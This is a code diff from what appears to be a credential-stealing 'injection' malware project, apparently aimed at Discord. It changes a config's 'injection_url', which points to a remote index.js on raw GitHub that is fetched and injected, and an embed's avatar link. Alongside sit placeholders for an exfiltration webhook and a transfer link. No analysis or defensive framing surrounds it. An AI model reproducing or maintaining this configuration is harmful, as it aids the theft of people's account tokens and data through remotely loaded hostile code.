@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/selfbot12345/sub/main/index.js",
+    "https://raw.githubusercontent.com/xzisko/subtest/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -79,7 +79,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
     username: "The Ghost Of Fuzzles",
     avatar_url:
-      "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png",
+      "https://raw.githubusercontent.com/xzisko/subtest/main/assets/lilnebula.png",
     content: "",
     embeds: [
       {
